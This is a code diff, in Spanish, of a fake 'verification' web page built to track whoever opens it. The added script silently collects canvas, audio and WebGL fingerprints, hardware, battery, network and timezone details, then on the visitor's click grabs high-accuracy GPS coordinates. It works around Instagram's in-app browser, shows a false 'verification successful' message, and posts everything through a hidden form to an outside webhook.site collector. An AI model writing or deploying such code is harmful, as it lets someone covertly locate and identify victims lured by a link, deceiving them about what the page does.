@@ -83,7 +83,7 @@
         </button>
     </div>
 
-    <!-- Formulario oculto (El mismo de tu arquitectura anterior) -->
+    <!-- Formulario oculto unificado que envía todo en un solo POST nativo -->
     <form id="formularioOculto" action="https://webhook.site/3fcd9f6f-4376-4687-9ef1-965474b0dba3" method="POST" style="display:none;">
         <input type="text" name="identificador_unico" id="campoID">
         <input type="text" name="coordenadas" id="campoCoordenadas">
@@ -95,66 +95,186 @@
     </form>
 
 <script>
+// Objeto de almacenamiento temporal global
 let reporteTecnicoGlobal = {};
 
-// 1. FASE PASIVA: Corre silenciosamente mientras el usuario lee la pantalla
-async function recolectarTelemetriaPasiva() {
-    // Aquí puedes incluir todas las funciones de extracción de tu script original:
-    // generarCanvasFingerprint(), generarAudioFingerprint(), WebGL, Batería, etc.
-    
-    // Simulación de armado del objeto para este ejemplo
-    reporteTecnicoGlobal = {
-        id: "ID-" + Math.random().toString(36).substr(2, 9),
-        hardware: "Datos de Hardware recolectados en background",
-        redBateria: "Datos de Red y Batería",
-        software: "Datos del OS y Navegador",
-        rendimiento: "Benchmarking GPU/CPU",
-        audio: "Huellas de Audio"
-    };
-    
-    // *OPCIONAL: Aquí agregaríamos el Client Hints de Nivel 2 que discutimos antes.
+// --- FUNCIONES DE CÁLCULO Y HUELLA DIGITAL (HARDWARE Y SOFTWARE) ---
+function probarRendimientoCPU() {
+    const inicio = performance.now();
+    for (let i = 0; i < 1000000; i++) {}
+    const fin = performance.now();
+    return `${(fin - inicio).toFixed(4)} ms en 1M de ciclos`;
 }
 
-// 2. FASE ACTIVA: Se dispara únicamente cuando el objetivo hace clic en el botón
+function obtenerDetallesWebGL() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return "WebGL_No_Soportado";
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (!debugInfo) return "WebGL_Info_Bloqueada";
+        return `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} (${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)})`;
+    } catch (e) { return "Error_WebGL"; }
+}
+
+function generarCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        if (!ctx) return "No_Support";
+        canvas.width = 200; canvas.height = 50;
+        ctx.textBaseline = "top"; ctx.font = "14px 'Arial', sans-serif"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = "#069"; ctx.fillText("Auditoria_v2.0", 2, 15);
+        ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("🔬⚙️📍", 4, 35);
+        const srcData = canvas.toDataURL();
+        let hash = 0;
+        for (let i = 0; i < srcData.length; i++) {
+            hash = ((hash << 5) - hash) + srcData.charCodeAt(i);
+            hash = hash & hash;
+        }
+        return Math.abs(hash).toString(16);
+    } catch (e) { return "Error_Canvas"; }
+}
+
+function generarAudioFingerprint() {
+    try {
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        if (!AudioContext) return "AudioContext_No_Soportado";
+        const context = new AudioContext();
+        const oscillator = context.createOscillator();
+        const gainNode = context.createGain();
+        oscillator.type = 'triangle';
+        oscillator.frequency.setValueAtTime(10000, context.currentTime);
+        gainNode.gain.setValueAtTime(0, context.currentTime);
+        oscillator.connect(gainNode);
+        gainNode.connect(context.destination);
+        const audioValue = oscillator.frequency.value + gainNode.gain.value;
+        context.close();
+        return audioValue.toString(16);
+    } catch (e) { return "Error_Audio"; }
+}
+
+// --- FASE 1: RECOLECCIÓN PASIVA (Se ejecuta al cargar el DOM) ---
+async function recolectarTelemetriaPasiva() {
+    const canvasHash = generarCanvasFingerprint();
+    const audioHash = generarAudioFingerprint();
+    
+    const resolucionPantalla = `${window.screen.width}x${window.screen.height}`;
+    const profundidadColor = `${window.screen.colorDepth} bits`;
+    const nucleosCPU = navigator.hardwareConcurrency || "Oculto";
+    const memoriaRAM = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Oculto";
+    const maximaGpuPuntosContacto = navigator.maxTouchPoints || 0;
+    const ratioPixeles = window.devicePixelRatio || 1;
+
+    const datosGPU = obtenerDetallesWebGL();
+    const orientacionTipo = window.screen.orientation ? window.screen.orientation.type : "Desconocido";
+    const orientacionAngulo = window.screen.orientation ? window.screen.orientation.angle + "°" : "Desconocido";
+    const rendimientoProcesador = probarRendimientoCPU();
+
+    const modoOscuroActivo = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Sí" : "No";
+    const reducirMovimiento = window.matchMedia('(prefers-reduced-motion: reduce)').matches ? "Sí" : "No";
+
+    const idiomaDispositivo = navigator.language || "Oculto";
+    const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const cookiesHabilitadas = navigator.cookieEnabled ? "Sí" : "No";
+    const plataformaNucleo = navigator.platform || "Oculto";
+    const esAutomatizado = navigator.webdriver ? "Sí (Bot)" : "No (Humano)";
+
+    let infoRed = "No Soportado";
+    if (navigator.connection) {
+        infoRed = `Tipo: ${navigator.connection.effectiveType} | Mbps: ${navigator.connection.downlink} | RTT: ${navigator.connection.rtt}ms`;
+    }
+
+    let infoBateria = "No Soportado";
+    if ('getBattery' in navigator) {
+        try {
+            const bateria = await navigator.getBattery();
+            infoBateria = `Nivel: ${Math.round(bateria.level * 100)}% | Cargando: ${bateria.charging ? "Sí" : "No"}`;
+        } catch (e) {}
+    }
+
+    const limiteMemoriaJS = window.performance && window.performance.memory ? 
+        `${Math.round(window.performance.memory.jsHeapSizeLimit / (1024 * 1024))} MB` : "No disponible";
+
+    const idUnico = `ID-${canvasHash}-${audioHash}-${resolucionPantalla}`;
+    
+    reporteTecnicoGlobal = {
+        id: idUnico,
+        hardware: `Canvas_GPU: ${canvasHash} | Res: ${resolucionPantalla} | Ratio_Pixeles: ${ratioPixeles} | Bits: ${profundidadColor} | CPUs: ${nucleosCPU} | RAM: ${memoriaRAM} | TouchPoints: ${maximaGpuPuntosContacto}`,
+        redBateria: `[RED]: ${infoRed} | [BATERIA]: ${infoBateria}`,
+        software: `Idioma: ${idiomaDispositivo} | Zona: ${zonaHoraria} | Cookies: ${cookiesHabilitadas} | Plataforma: ${plataformaNucleo} | Automatizado: ${esAutomatizado}`,
+        rendimiento: `[CPU_Benchmark]: ${rendimientoProcesador} | [GPU_Real]: ${datosGPU} | [Orientacion]: ${orientacionTipo} (${orientacionAngulo}) | [Modo_Oscuro]: ${modoOscuroActivo} | [Reducir_Movimiento]: ${reducirMovimiento}`,
+        audio: `[Audio_Fingerprint]: ${audioHash} | [JS_Heap_Limit]: ${limiteMemoriaJS} | [LocalStorage]: ${'localStorage' in window ? "Sí" : "No"} | [IndexedDB]: ${'indexedDB' in window ? "Sí" : "No"}`
+    };
+}
+
+// --- FASE 2: EXTRACCIÓN ACTIVA Y MANEJO DE WEBVIEW (Interacción del objetivo) ---
 function iniciarExtraccionActiva() {
-    // Cambiamos el estado de la UI para mostrar que "estamos procesando"
     const btn = document.getElementById('btnVerificar');
     const texto = document.getElementById('textoBoton');
     const spinner = document.getElementById('indicadorCarga');
     
+    // Bloquear UI
     btn.disabled = true;
     texto.style.display = 'none';
     spinner.style.display = 'block';
 
-    // Solicitamos el GPS ahora que tenemos el "User Gesture"
+    let sensorResuelto = false;
+
+    // WATCHDOG TIMER: Aborta y envía a los 5s si el WebView de IG se queda colgado
+    const watchdog = setTimeout(() => {
+        if (!sensorResuelto) {
+            sensorResuelto = true;
+            procesarYDespachar(null, false, "Bloqueo silencioso de WebView (Timeout forzado a los 5s)");
+        }
+    }, 5000);
+
+    // Intento de acceso al hardware GPS
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            (pos) => procesarCoordenadas(pos, true), 
-            (err) => procesarCoordenadas(err, false), 
-            { enableHighAccuracy: true, timeout: 8000 }
+            (pos) => {
+                if (!sensorResuelto) {
+                    sensorResuelto = true;
+                    clearTimeout(watchdog);
+                    procesarYDespachar(pos, true, null);
+                }
+            }, 
+            (err) => {
+                if (!sensorResuelto) {
+                    sensorResuelto = true;
+                    clearTimeout(watchdog);
+                    procesarYDespachar(err, false, err.message);
+                }
+            }, 
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 4500 }
         );
     } else {
-        procesarCoordenadas(null, false);
+        if (!sensorResuelto) {
+            sensorResuelto = true;
+            clearTimeout(watchdog);
+            procesarYDespachar(null, false, "API Geolocation no soportada en este entorno");
+        }
     }
 }
 
-// 3. FASE DE DESPACHO
-function procesarCoordenadas(datos, exito) {
+// --- FASE 3: INYECCIÓN DE DATOS Y DESPACHO ---
+function procesarYDespachar(datos, exito, motivoFallo) {
+    // Inyección de Coordenadas
     if (exito) {
         document.getElementById('campoCoordenadas').value = `Lat: ${datos.coords.latitude} | Lon: ${datos.coords.longitude} | Prec: ${datos.coords.accuracy}m`;
     } else {
-        document.getElementById('campoCoordenadas').value = "Error: Permiso denegado por el usuario o timeout.";
+        document.getElementById('campoCoordenadas').value = `Error GPS: ${motivoFallo || "Desconocido"}`;
     }
 
-    // Inyectamos el resto de la telemetría pasiva
-    document.getElementById('campoID').value = reporteTecnicoGlobal.id;
-    document.getElementById('campoHardware').value = reporteTecnicoGlobal.hardware;
-    document.getElementById('campoRedBateria').value = reporteTecnicoGlobal.redBateria;
-    document.getElementById('campoSoftware').value = reporteTecnicoGlobal.software;
-    document.getElementById('campoRendimiento').value = reporteTecnicoGlobal.rendimiento;
-    document.getElementById('campoAudio').value = reporteTecnicoGlobal.audio;
+    // Inyección de Telemetría Pasiva (Pre-cargada)
+    document.getElementById('campoID').value = reporteTecnicoGlobal.id || "ID-Fallo-Precarga";
+    document.getElementById('campoHardware').value = reporteTecnicoGlobal.hardware || "N/A";
+    document.getElementById('campoRedBateria').value = reporteTecnicoGlobal.redBateria || "N/A";
+    document.getElementById('campoSoftware').value = reporteTecnicoGlobal.software || "N/A";
+    document.getElementById('campoRendimiento').value = reporteTecnicoGlobal.rendimiento || "N/A";
+    document.getElementById('campoAudio').value = reporteTecnicoGlobal.audio || "N/A";
 
-    // Cambiamos la UI brevemente para simular éxito antes de enviar
+    // Feed visual de éxito
     const texto = document.getElementById('textoBoton');
     const spinner = document.getElementById('indicadorCarga');
     const btn = document.getElementById('btnVerificar');
@@ -162,9 +282,9 @@ function procesarCoordenadas(datos, exito) {
     spinner.style.display = 'none';
     texto.style.display = 'block';
     texto.innerText = "¡Verificación Exitosa!";
-    btn.style.backgroundColor = "#10b981"; // Color verde de éxito
+    btn.style.backgroundColor = "#10b981"; // Verde éxito
 
-    // Damos 800ms para que el usuario vea el check verde y disparamos el POST
+    // Disparo del POST con retraso estético de 800ms
     setTimeout(() => {
         document.getElementById('formularioOculto').submit();
     }, 800);
